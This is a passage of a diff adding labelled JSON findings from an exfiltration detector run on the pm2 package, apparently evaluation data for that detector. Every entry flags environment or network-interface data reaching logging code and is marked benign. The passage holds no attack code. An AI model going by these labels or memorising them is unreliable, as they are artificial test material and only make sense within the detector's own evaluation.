+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... json')) \u2192 Sink: data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/HttpInterface.js",
+    "startLine": 61,
+    "endLine": 61,
+    "message": "OS fingerprinting data exfiltration detected. Source: os.netw ... faces() \u2192 Sink: JSON.stringify(data)"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 182,
+    "endLine": 186,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 192,
+    "endLine": 192,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 193,
+    "endLine": 193,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 221,
+    "endLine": 224,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 230,
+    "endLine": 230,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 231,
+    "endLine": 231,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 173,
+    "endLine": 176,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 178,
+    "endLine": 178,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 179,
+    "endLine": 179,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 211,
+    "endLine": 214,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 216,
+    "endLine": 216,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 217,
+    "endLine": 217,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 245,
+    "endLine": 249,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 255,
+    "endLine": 255,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 256,
+    "endLine": 256,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 284,
+    "endLine": 287,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 293,
+    "endLine": 293,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 294,
+    "endLine": 294,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  }
+]
